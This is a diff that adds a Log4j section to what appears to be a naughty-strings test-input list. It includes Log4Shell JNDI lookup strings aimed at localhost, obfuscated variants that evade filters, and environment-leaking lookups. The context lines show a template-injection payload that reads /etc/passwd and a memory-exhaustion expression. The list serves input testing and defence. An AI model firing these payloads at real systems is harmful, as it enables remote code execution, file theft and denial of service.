@@ -759,3 +759,18 @@ Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗
 
 {% print 'x' * 64 * 1024**3 %}
 {{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+
+#	Log4j Lookups
+#
+#	Strings which Apache Log4j 2 expands when they are logged, including the JNDI
+#	lookups of Log4Shell (CVE-2021-44228, CVE-2021-45046) and obfuscated variants
+
+${jndi:ldap://127.0.0.1/blns}
+${jndi:dns://127.0.0.1/blns}
+${jndi:rmi://127.0.0.1/blns}
+${jndi:ldap://127.0.0.1#example.com/blns}
+${${lower:j}ndi:${lower:l}dap://127.0.0.1/blns}
+${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1/blns}
+${${env:BLNS:-j}ndi${env:BLNS:-:}${env:BLNS:-l}dap${env:BLNS:-:}//127.0.0.1/blns}
+${env:HOME}
+${java:version}
